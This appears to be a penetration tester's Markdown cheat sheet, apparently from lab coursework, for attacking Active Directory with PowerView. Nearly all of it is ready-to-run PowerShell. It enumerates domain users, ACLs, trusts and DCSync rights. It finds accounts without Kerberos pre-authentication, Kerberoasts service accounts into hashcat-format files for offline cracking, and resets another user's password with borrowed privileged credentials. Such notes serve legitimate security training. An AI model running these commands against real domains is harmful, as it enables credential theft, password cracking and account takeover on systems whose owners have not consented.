---
type: tool
category: AD
tags:
  - tool
---
# Overview
`Domain Credentials needed!`
## How to use
1. Download Module-Library: https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
2. Import it to `PowerShell`
```powershell
Import-Module .\PowerView.ps1
```
## Commands
#### Enum domain-users
Enum domain-users and save them to a file
```powershell
(Get-DomainUser).samaccountname | Out-File -FilePath "C:\Users\AB920\Documents\Userlist.txt"
```
#### ACL ENUM - Powerview
##### Query Users ACL - Powerview
1. Import Powershell Module:
```powershell
Import-Module .\PowerView.ps1
```
2. Convert Username to `SID`:
```powershell
$sid = Convert-NameToSid USERNAME
```
3. List objects linked to our user:
```powershell
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```
#### Get Domain-User Information - PowerView 

```powershell
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
```
#### List Users of group `Remote Desktop Users` (RDP)
```Powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```

#### List Users of group `Remote Management Users` (WinRM)
```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

#### Retrieve SID of Domain - PowerView
```powershell
Get-DomainSID
```

#### Obtaining Enterprise Admins Group's SID - PowerView
```powershell
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

#### Checking for Existing Trusts - PowerView
1. Import Module
2. List existing Trusts:
```powershell
Get-DomainTrust
```
We can also map both directions:
```powershell
Get-DomainTrustMapping
```

3. After mapping the child domains, we can check for any users in it:
```powershell
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
```
#### Enumerating for DONT_REQ_PREAUTH Value - PowerView
```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```
#### Recursive Group Membership - PowerView
Retrieve information about `nested group membership` , meaning which group is part of which overlaying group:
```powershell
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```
#### Check which user has Reversible Encryption set
`Reversible Encryption` means, that the users password is encrypted symmetrically. The trick here is that the key needed to decrypt it is stored in the registry (the [Syskey](https://docs.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview)) and can be extracted by a Domain Admin or equivalent. Tools such as `secretsdump.py` will decrypt any passwords stored using reversible encryption while dumping the NTDS file either as a Domain Admin or using an attack such as DCSync.
We can easily check which users have the attribute set with `PowerView`:
1. Load module
```powershell
Import-Module .\PowerView.ps1
```

2. Query all user-objects with the attribut `ENCRYPTED_TEXT_PWD_ALLOWED` set:
```powershell
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

#### Check Foreign Group Members - PowerView
We can use the PowerView function [Get-DomainForeignGroupMember](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainForeignGroupMember/) to enumerate groups with users that do not belong to the domain, also known as `foreign group membership`.
```powershell
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
```

#### Check if user has DC-Sync attribute set - PowerView
1. Import Module and retrieve `SID` of user
```powershell
Import-Module .\PowerView.ps1
```

```powershell
Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
```
2. Set `SID` according to previous output and retrieve `Object memberships` of domain object (in this case "DC=inlanefreight,DC=local"):
```powershell
$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
```

```powershell
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```
A positive output would look something like this:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261005123117.png)

#### Kerboroasting - PowerView
1. Load module and enumerate SPN Accounts:
```powershell
Import-Module .\PowerView.ps1
```
If we want to do this `across forests` we can specifiy the forest-domain with ``-Domain FQDN
```powershell
Get-DomainUser * -spn | select samaccountname,memberof
```

2. Retrieve ticket from specific User and export it to `.csv` file:
```powershell
Get-DomainUser -Identity USERNAME | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\USERNAME.csv -NoTypeInformation
```

or retrieve and export all SPN-tickets to `.csv` file:
```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

3. Transfer `.csv` or "hashcat-strings" to attackbox and crack 

#### Change domain User password
1. Set user and password variable of known "privileged" user credentials:
```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
```

```powershell
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 
```
2. Set password we want to set for the other domain user:
```powershell
$damundsenPassword = ConvertTo-SecureString 'NothingToSeeHere1!' -AsPlainText -Force
```
3. Now we can import the powershell module and execute the `Set-DomainUserPassword` function:
```powershell
Import-Module .\PowerView.ps1
```

```powershell
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

## Important Parameter
.\PowerView.ps1 
	`ResolveGUIDs` = resolves unreadable GUID objects like "ObjectAceType" into a human readable output like "User-Force-Change-Password"